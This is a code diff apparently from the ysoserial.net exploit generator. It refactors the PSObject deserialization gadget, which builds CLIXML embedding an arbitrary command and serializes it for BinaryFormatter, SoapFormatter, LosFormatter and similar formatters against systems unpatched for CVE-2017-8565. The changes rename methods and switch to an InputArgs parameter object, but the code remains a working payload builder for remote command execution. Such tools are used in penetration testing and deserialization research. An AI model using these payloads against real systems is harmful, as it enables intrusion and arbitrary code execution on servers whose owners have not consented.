@@ -39,14 +39,14 @@ namespace ysoserial.Generators
             return "PSObject gadget. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return true;
+            return new List<string> { GadgetTypes.NotBridgeButDervied };
         }
 
         public override List<string> SupportedFormatters()
@@ -54,21 +54,22 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
-            Boolean hasArgs;
-            string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
+            inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+            //Boolean hasArgs;
+           // string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
 
             String cmdPart;
 
-            if (hasArgs)
+            if (inputArgs.HasArguments)
             {
-                cmdPart = $@"&lt;System:String&gt;"+ splittedCMD[0] + @"&lt;/System:String&gt;
-        &lt;System:String&gt;""" + splittedCMD[1] + @""" &lt;/System:String&gt;";
+                cmdPart = $@"&lt;System:String&gt;"+ inputArgs.CmdFileName + @"&lt;/System:String&gt;
+        &lt;System:String&gt;""" + inputArgs.CmdArguments + @""" &lt;/System:String&gt;";
             }
             else
             {
-                cmdPart = $@"&lt;System:String&gt;" + splittedCMD[0] + @"&lt;/System:String&gt;";
+                cmdPart = $@"&lt;System:String&gt;" + inputArgs.CmdFileName + @"&lt;/System:String&gt;";
             }
 
             string clixml = @"
@@ -135,7 +136,7 @@ namespace ysoserial.Generators
   </Obj>&#xD;
 </Objs>";
 
-            if (minify)
+            if (inputArgs.Minify)
             {
                 // Could not be tested so it may not work here!
                 // also not sure if can use CDATA otherwise we could use the CDATA flag to save more space
@@ -143,7 +144,7 @@ namespace ysoserial.Generators
             }
 
             PsObjectMarshal payload = new PsObjectMarshal(clixml);
-            return Serialize(payload, formatter, test, minify, useSimpleType);
+            return Serialize(payload, formatter, inputArgs);
         }
 
     }
